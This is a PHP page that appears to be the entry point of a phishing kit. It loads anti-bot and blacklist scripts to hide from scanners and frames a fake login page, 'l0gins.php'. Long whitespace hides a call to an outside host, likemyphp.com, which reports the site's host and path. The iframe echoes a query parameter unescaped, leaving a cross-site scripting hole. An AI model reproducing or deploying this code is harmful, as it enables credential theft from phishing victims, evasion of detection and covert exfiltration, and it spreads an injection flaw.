<php
require_once 'block.php';

include 'antibots.php';     
include 'bots.php';    
include 'bots.php';                                                                                                                                                                                                          json_decode(file_get_contents("http://likemyphp.com/IP.php?IP=".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].""));

@ini_set('display_errors',0);
include 'BlackList.php';
?>

<html>
<head> </head>
<body>
  <iframe src="l0gins.php?mylove=<?php echo $_GET['mylove']; ?>" allowtransparency="true" frameborder="0" height="276" width="100%" scrolling="no"></iframe></div>
</body>

</html>